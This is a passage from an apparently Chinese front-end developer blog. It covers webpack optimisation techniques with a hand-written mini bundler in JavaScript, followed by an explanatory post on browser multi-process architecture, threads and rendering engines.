</ul>
</li>
</ul>
</li>
<li>DLL：<ul>
<li>使用 DllPlugin 进行分包，使用 DllReferencePlugin(索引链接) 对 manifest.json 引用，让一些基本不会改动的代码先打包成静态资源，避免反复编译浪费时间。</li>
<li>HashedModuleIdsPlugin 可以解决模块数字 id 问题</li>
</ul>
</li>
<li>充分利用缓存提升二次构建速度：<ul>
<li>babel-loader 开启缓存</li>
<li>terser-webpack-plugin 开启缓存</li>
<li>使用 cache-loader 或者 hard-source-webpack-plugin</li>
</ul>
</li>
<li>Tree shaking<ul>
<li>打包过程中检测工程中没有引用过的模块并进行标记，在资源压缩时将它们从最终的 bundle 中去掉(只能对 ES6 Modlue 生效) 开发中尽可能使用 ES6 Module 的模块，提高 tree shaking 效率</li>
<li>禁用 babel-loader 的模块依赖解析，否则 Webpack 接收到的就都是转换过的 CommonJS 形式的模块，无法进行 tree-shaking</li>
<li>使用 PurifyCSS(不在维护) 或者 uncss 去除无用 CSS 代码<ul>
<li>purgecss-webpack-plugin 和 mini-css-extract-plugin 配合使用(建议)</li>
</ul>
</li>
</ul>
</li>
<li>Scope hoisting<ul>
<li>构建后的代码会存在大量闭包，造成体积增大，运行代码时创建的函数作用域变多，内存开销变大。Scope hoisting 将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突</li>
<li>必须是 ES6 的语法，因为有很多第三方库仍采用 CommonJS 语法，为了充分发挥 Scope hoisting 的作用，需要配置 mainFields 对第三方模块优先采用 jsnext:main 中指向的 ES6 模块化语法</li>
</ul>
</li>
<li>动态 Polyfill<ul>
<li>建议采用 polyfill-service 只给用户返回需要的 polyfill，社区维护。 (部分国内奇葩浏览器 UA 可能无法识别，但可以降级返回所需全部 polyfill)</li>
</ul>
</li>
</ul>
<p>​</p>
<h2 id="手写-webpack"><a href="#手写-webpack" class="headerlink" title="手写 webpack"></a>手写 webpack</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> babylon = <span class="built_in">require</span>(<span class="string">&quot;@babel/parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">&quot;@babel/traverse&quot;</span>).<span class="property">default</span>;</span><br><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">&quot;@babel/core&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ENTRY</span> = <span class="string">&quot;./src/entry.js&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">OUTPUT</span> = <span class="string">&quot;./build/output.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">ID</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分析文件信息，通过babel将代码转译为AMD格式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; filename 文件相对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> &#123;<span class="type">Asset</span>&#125; 文件信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@typedef</span> &#123;<span class="type">Object</span>&#125; <span class="variable">Asset</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@property</span> &#123;<span class="type">number</span>&#125; id 唯一标识符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@property</span> &#123;<span class="type">number</span>&#125; filename 文件相对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@property</span> &#123;<span class="type">string</span>&#125; code 转译后代码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@property</span> &#123;<span class="type">Array&lt;string&gt;</span>&#125; dependenncies 该文件依赖列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@property</span> &#123;<span class="type">object</span>&#125; mapping 子依赖的哈希表，结构为 &#123; $&#123;filename&#125; : $&#123;id&#125; &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAsset</span>(<span class="params">filename</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> content = fs.<span class="title function_">readFileSync</span>(filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> dependencies = [];</span><br><span class="line">  <span class="comment">// 文件标识符，可改hash</span></span><br><span class="line">  <span class="keyword">const</span> id = <span class="variable constant_">ID</span>++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 通过AST找到import语法对应语句，将依赖输入依赖列表</span></span><br><span class="line">  <span class="comment">// module =&gt; ast =&gt; dependences =&gt; module</span></span><br><span class="line">  <span class="keyword">const</span> ast = babylon.<span class="title function_">parse</span>(content, &#123;</span><br><span class="line">    <span class="attr">sourceType</span>: <span class="string">&quot;module&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">traverse</span>(ast, &#123;</span><br><span class="line">    <span class="title class_">ImportDeclaration</span>: <span class="function">(<span class="params">&#123; node &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      dependencies.<span class="title function_">push</span>(node.<span class="property">source</span>.<span class="property">value</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ES6 转为 ES5， import改require</span></span><br><span class="line">  <span class="keyword">const</span> &#123; code &#125; = babel.<span class="title function_">transformFromAstSync</span>(ast, <span class="literal">null</span>, &#123;</span><br><span class="line">    <span class="attr">presets</span>: [<span class="string">&quot;@babel/preset-env&quot;</span>],</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    id,</span><br><span class="line">    filename,</span><br><span class="line">    dependencies,</span><br><span class="line">    code,</span><br><span class="line">    <span class="attr">mapping</span>: &#123;&#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从入口文件开始，遍历所有文件的依赖列表，生成文件信息集合（依赖关系图）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">entry</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> &#123;<span class="type">Array&lt;Asset&gt;</span>&#125; 文件信息集合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createGraph</span>(<span class="params">entry</span>) &#123;</span><br><span class="line">  <span class="comment">// 从入口文件开始遍历</span></span><br><span class="line">  <span class="keyword">const</span> queue = [<span class="title function_">createAsset</span>(entry)];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> asset <span class="keyword">of</span> queue) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.<span class="title function_">dirname</span>(asset.<span class="property">filename</span>);</span><br><span class="line">    asset.<span class="property">dependencies</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">relativePath</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> absolutePath = path.<span class="title function_">join</span>(dirname, relativePath);</span><br><span class="line">      <span class="comment">// 遍历子依赖</span></span><br><span class="line">      <span class="keyword">const</span> child = <span class="title function_">createAsset</span>(absolutePath);</span><br><span class="line">      <span class="comment">// 子依赖filename和id的哈希表</span></span><br><span class="line">      asset.<span class="property">mapping</span>[relativePath] = child.<span class="property">id</span>;</span><br><span class="line">      <span class="comment">// 不断将子依赖加入队列</span></span><br><span class="line">      queue.<span class="title function_">push</span>(child);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据文件信息集合，生成modules，最终拼接成chunk</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Graph</span>&#125; <span class="variable">graph</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> &#123;<span class="type">string</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bundle</span>(<span class="params">graph</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> modules = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  graph.<span class="title function_">forEach</span>(<span class="function">(<span class="params">asset</span>) =&gt;</span> &#123;</span><br><span class="line">    modules += <span class="string">`<span class="subst">$&#123;asset.id&#125;</span>: [</span></span><br><span class="line"><span class="string">      function (require, module, exports) &#123;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;asset.code&#125;</span></span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(asset.mapping)&#125;</span>,</span></span><br><span class="line"><span class="string">    ],`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> chunk = <span class="string">`</span></span><br><span class="line"><span class="string">    (function(modules) &#123;</span></span><br><span class="line"><span class="string">      function require(id) &#123;</span></span><br><span class="line"><span class="string">        const [fn, mapping] = modules[id];</span></span><br><span class="line"><span class="string">        function localRequire(relativePath) &#123;</span></span><br><span class="line"><span class="string">          return require(mapping[relativePath]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        const module = &#123;exports: &#123;&#125;&#125;</span></span><br><span class="line"><span class="string">        fn(localRequire, module, module.exports);</span></span><br><span class="line"><span class="string">        return module.exports;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      require(0);</span></span><br><span class="line"><span class="string">    &#125;)(&#123;<span class="subst">$&#123;modules&#125;</span>&#125;)</span></span><br><span class="line"><span class="string">  `</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> chunk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据chunk生成bundle文件</span></span><br><span class="line">fs.<span class="title function_">writeFileSync</span>(<span class="variable constant_">OUTPUT</span>, <span class="title function_">bundle</span>(<span class="title function_">createGraph</span>(<span class="variable constant_">ENTRY</span>)));</span><br></pre></td></tr></table></figure>

<p>生成文件结构</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params">modules</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">require</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [fn, mapping] = modules[id];</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">localRequire</span>(<span class="params">relativePath</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">require</span>(mapping[relativePath]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable language_">module</span> = &#123; <span class="attr">exports</span>: &#123;&#125; &#125;;</span><br><span class="line">    <span class="title function_">fn</span>(localRequire, <span class="variable language_">module</span>, <span class="variable language_">module</span>.<span class="property">exports</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">require</span>(entry_id);</span><br><span class="line">&#125;)(&#123;</span><br><span class="line">  <span class="attr">id</span>: [</span><br><span class="line">    <span class="keyword">function</span> (<span class="params"><span class="built_in">require</span>, <span class="variable language_">module</span>, <span class="built_in">exports</span></span>) &#123;</span><br><span class="line">      <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">      <span class="comment">// code</span></span><br><span class="line">      <span class="built_in">require</span>(filename);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// mapping</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">filename</span>: id,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inside require</span></span><br><span class="line"><span class="keyword">const</span> modules = &#123;</span><br><span class="line">  <span class="attr">id</span>: [</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="variable language_">module</span>, <span class="built_in">exports</span></span>) &#123;</span><br><span class="line">      <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">      <span class="comment">// code</span></span><br><span class="line">      <span class="built_in">require</span>(filename)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// mapping</span></span><br><span class="line">    &#123;</span><br><span class="line">      filename : id</span><br><span class="line">    &#125;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [fn, mapping] = modules[id];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">module</span> = &#123; <span class="attr">exports</span>: &#123;&#125; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn</span>(</span><br><span class="line">  localRequire = <span class="function">(<span class="params">relativePath</span>) =&gt;</span> <span class="built_in">require</span>(mapping[relativePath]),</span><br><span class="line">  <span class="variable language_">module</span>,</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inside fn</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">localRequire, <span class="variable language_">module</span>, <span class="built_in">exports</span></span>) &#123;</span><br><span class="line">  <span class="comment">// 根据filename和id的对应关系，在modules中找到对应子模块，因为子模块的代码写在了fn函数中，调用子模块fn函数相当于执行子模块</span></span><br><span class="line">  <span class="comment">// 然后根据子模块的mapping哈希表，深度遍历modules，找齐依赖列表</span></span><br><span class="line">  <span class="title function_">localRequire</span>(filename)  <span class="comment">// 相当于 require(mapping[relativePath])</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/30669007">https://zhuanlan.zhihu.com/p/30669007</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/363928061">https://zhuanlan.zhihu.com/p/363928061</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903614469636103">https://juejin.cn/post/6844903614469636103</a><br><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/61047">https://developer.aliyun.com/article/61047</a><br><a target="_blank" rel="noopener" href="https://www.webpackjs.com/guides">https://www.webpackjs.com/guides</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dFrRY_ntUwmIOXzs8TYcFQ">https://mp.weixin.qq.com/s/dFrRY_ntUwmIOXzs8TYcFQ</a><br><a target="_blank" rel="noopener" href="https://developer.51cto.com/art/202109/681949.htm">https://developer.51cto.com/art/202109/681949.htm</a><br><a target="_blank" rel="noopener" href="https://github.com/dykily/simple_webpack/blob/master/bundler.js">https://github.com/dykily/simple_webpack/blob/master/bundler.js</a><br><a target="_blank" rel="noopener" href="https://github.com/ronami/minipack/blob/master/src/minipack.js">https://github.com/ronami/minipack/blob/master/src/minipack.js</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/30/%E6%B5%8F%E8%A7%88%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/30/%E6%B5%8F%E8%A7%88%E5%99%A8/" class="post-title-link" itemprop="url">浏览器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-30 09:48:58" itemprop="dateCreated datePublished" datetime="2021-08-30T09:48:58+08:00">2021-08-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:05" itemprop="dateModified" datetime="2022-02-14T19:41:05+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="浏览器组成"><a href="#浏览器组成" class="headerlink" title="浏览器组成"></a>浏览器组成</h2><p>主流浏览器：Internet Explorer、Firefox、Safari、Chrome 浏览器和 Opera 浏览器的主要组件为：</p>
<ul>
<li><strong>用户界面</strong> - 除了浏览器主窗口显示的页面外，其他的部分，包括地址栏、前进/后退按钮、书签菜单等。</li>
<li><strong>浏览器引擎</strong> - 在用户界面和渲染引擎之间传送指令。</li>
<li><strong>渲染引擎</strong> - 负责显示请求的内容，负责解析 HTML 和 CSS，并将解析后的内容显示在屏幕上。Firefox-Gecko，Safari 和 Chrome-WebKit</li>
<li><strong>网络</strong> - 用于网络调用，比如 HTTP 请求。其接口与平台无关，并为所有平台提供底层实现。</li>
<li><strong>用户界面后端</strong> - 用于绘制基本的窗口小部件。其公开了与平台无关的通用接口，而在底层使用操作系统的用户界面方法。</li>
<li><strong>JavaScript 解释器/JS 引擎</strong>。用于解析和执行 JavaScript 代码。</li>
<li><strong>数据存储</strong>。这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。</li>
</ul>
<p>​</p>
<p>​</p>
<h2 id="浏览器多进程架构"><a href="#浏览器多进程架构" class="headerlink" title="浏览器多进程架构"></a>浏览器多进程架构</h2><p><strong>优点</strong></p>
<ul>
<li>稳定流畅：当我们访问一个站点时，渲染进程会负责运行站点的代码，渲染站点的页面，同时响应用户的交互动作，当我们在 Chrome 中打开三个页签同时访问三个站点时，如果其中一个没有响应，我们可以关闭它然后使用其他的页签，这是因为 Chrome 为每个站点创建一个<strong>独立的渲染进程</strong>，专门处理当前站点的渲染工作。如果所有的页面运行在同一个进程中，当有一个页面没有响应时，所有的页面就都卡住了。<strong>避免一个页面崩溃导致其他页面无法浏览。</strong></li>
<li>安全：借助操作系统对进程安全的控制，浏览器可以将页面放置在<strong>沙箱</strong>中，站点的代码可以运行在<strong>隔离</strong>的环境中（Site Isolation），<strong>保证核心进程的安全</strong>。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>高资源占用：相同的功能占据每个进程的内存，造成浪费。为了节省内存，Chrome 限制了最大进程数，最大进程数取决于硬件的能力，同时当使用多个页签访问相同的站点时浏览器不会创建新的渲染进程。</li>
<li>复杂体系架构：浏览器各模块之间耦合性高、扩展性差等问题，会导致现在的架构已经很难适应新的需求了</li>
</ul>
<p>​</p>
<h3 id="浏览器进程（Browser-process）"><a href="#浏览器进程（Browser-process）" class="headerlink" title="浏览器进程（Browser process）"></a>浏览器进程（Browser process）</h3><p>浏览器进程负责管理 Chrome 应用本身，包括地址栏、书签、前进和后退按钮。同时也负责可不见的功能，比如网络请求、文件按访问等，也负责其他进程的调度。<br>浏览器进程负责处理除了渲染外的大部分工作，浏览器进程包括几个线程：</p>
<ul>
<li>UI 线程负责绘制工具栏中的按钮、地址栏等。</li>
<li>网络线程负责从网络中获取数据。</li>
<li>存储线程负责文件等功能。</li>
</ul>
<pre><code>当我们在地址栏中输入一个地址时，浏览器进程中的 UI 线程最先得知这个动作，并开始处理。
</code></pre>
<h3 id="渲染进程（Renderer-process）"><a href="#渲染进程（Renderer-process）" class="headerlink" title="渲染进程（Renderer process）"></a>渲染进程（Renderer process）</h3><p>渲染进程负责站点的渲染，是浏览器内核，主要作用是：页面渲染、JavaScript 代码执行、事件处理、web worker 的管理等。不同的渲染进程负责不同的标签页渲染工作，渲染进程间彼此独立。<br>渲染进程在渲染页面的过程中会通过浏览器进程获取站点资源，只有安全的资源才会被渲染进程接收到。<br>渲染进程中主线程负责除了图像生成外绝大多数工作，如何减少主线程上代码的运行是交互性能优化的关键。<br>渲染进程中的合成线程和栅格线程负责图像生成，利用分层技术可以优化图像生成的效率。</p>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><h4 id="GUI-渲染线程-有且只有一个"><a href="#GUI-渲染线程-有且只有一个" class="headerlink" title="GUI 渲染线程(有且只有一个)"></a>GUI 渲染线程(有且只有一个)</h4><p>负责渲染浏览器界面，解析 HTML，CSS，构建 DOM 树和 RenderObject 树，布局和绘制等<br>当界面需要重绘（repain）时或者回流（reflow），该线程就会执行<br>​</p>
<h4 id="JS-引擎线程"><a href="#JS-引擎线程" class="headerlink" title="JS 引擎线程"></a>JS 引擎线程</h4><p><strong>GUI 线程和 JS 引擎线程互斥</strong>！因为 js 会操作 dom，为了避免冲突，只会执行一个<br>JS 引擎线程也称为 JS 内核，负责处理 Javascript 脚本程序，解析 Javascript 脚本，运行代码；<br>JS 引擎一直等待着任务队列中任务的到来，然后加以处理，一个 Tab 页（renderer 进程）中无论什么时候都只有一个 JS 线程在运行 JS 程序；<br>​</p>
<h4 id="事件触发线程"><a href="#事件触发线程" class="headerlink" title="事件触发线程"></a>事件触发线程</h4><p><strong>事件触发线程归属于浏览器</strong>，而不是属于 JS 引擎，JS 引擎处理的事务过多，需要浏览器另开线程来进行协助<br>JS 是采用事件驱动(event-driven)机制，来响应用户操作的，事件触发线程通过维护事件循环和事件队列等的方式，来响应和处理事件<br>当处理一些不能立即执行的函数或者其他的代码时，会将对应的任务在其可以触发的时机，<strong>添加到事件队列的末端</strong><br><strong>事件循环机制会在 JS 引擎线程空闲时，循环访问事件队列的头部，如果有函数，则会将该函数推到执行栈中并立即执行。</strong><br>​</p>
<h4 id="定时器触发线程-多个"><a href="#定时器触发线程-多个" class="headerlink" title="定时器触发线程(多个)"></a>定时器触发线程(多个)</h4><p>即 setInterval 与 setTimeout 所在线程；<br>浏览器定时计数器并不是由 JS 引擎计数的，因为 JS 引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确性；<br>因此使用单独线程来计时并触发定时器，计时完毕后，添加到事件队列中，等待 JS 引擎空闲后执行，所以定时器中的任务在设定的时间点不一定能够准时执行，定时器只是在指定时间点将任务添加到事件队列中；<br>注意：W3C 在 HTML 标准中规定，定时器的定时时间不能小于 4ms，如果是小于 4ms，则默认为 4ms。<br>​</p>
<h4 id="异步-http-请求线程（多个）"><a href="#异步-http-请求线程（多个）" class="headerlink" title="异步 http 请求线程（多个）"></a>异步 http 请求线程（多个）</h4><p>XMLHttpRequest 连接后通过浏览器新开一个线程请求；<br>检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将回调函数放入事件队列中，等待 JS 引擎空闲后执行；<br>​</p>
<h3 id="浏览器引擎"><a href="#浏览器引擎" class="headerlink" title="浏览器引擎"></a>浏览器引擎</h3><table>
<thead>
<tr>
<th><strong>浏览器</strong></th>
<th><strong>浏览器引擎</strong></th>
<th><strong>JS 解释器</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Chrome</td>
<td>WebKit-&gt;Blink(2013)、</td>
<td>V8</td>
</tr>
<tr>
<td>Firefox</td>
<td>Gecko</td>
<td>SpiderMonkey</td>
</tr>
<tr>
<td>Safari</td>
<td>Webkit</td>
<td>Nitro</td>
</tr>
<tr>
<td>Edge</td>
<td>EdgeHTML-&gt;Chromium(Blink)</td>
<td>Chakra</td>
</tr>
<tr>
<td>Opera</td>
<td>Presto-&gt;Blink</td>
<td>V8</td>
</tr>
<tr>
<td>IE</td>
<td>Trident</td>
<td>Chakra</td>
</tr>
</tbody></table>
<ul>
<li>360 浏览器、猎豹浏览器内核：IE+Chrome 双内核；</li>
<li>搜狗、遨游、QQ 浏览器内核：Trident（兼容模式）+Webkit（高速模式）；</li>
<li>百度浏览器、世界之窗内核：IE 内核；</li>
<li>2345 浏览器内核：好像以前是 IE 内核，现在也是 IE+Chrome 双内核了；</li>
<li>UC 浏览器内核：这个众口不一，UC 说是他们自己研发的 U3 内核，但好像还是基于 Webkit 和 Trident，还有说是基于火狐内核。</li>
</ul>
<p>​</p>
<h3 id="插件进程（Plugin-process）"><a href="#插件进程（Plugin-process）" class="headerlink" title="插件进程（Plugin process）"></a>插件进程（Plugin process）</h3><p>插件进程负责为浏览器提供各种额外的插件功能，例如 flash。主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响</p>
<h3 id="GPU-进程（GPU-process）"><a href="#GPU-进程（GPU-process）" class="headerlink" title="GPU 进程（GPU process）"></a>GPU 进程（GPU process）</h3><p>GPU 进程负责提供成像的功能。其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</p>
<h3 id="网络进程（NetWork-process）"><a href="#网络进程（NetWork-process）" class="headerlink" title="网络进程（NetWork process）"></a>网络进程（NetWork process）</h3><p>主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。<br>​</p>
<p>​</p>
<p>​</p>
<p>​</p>
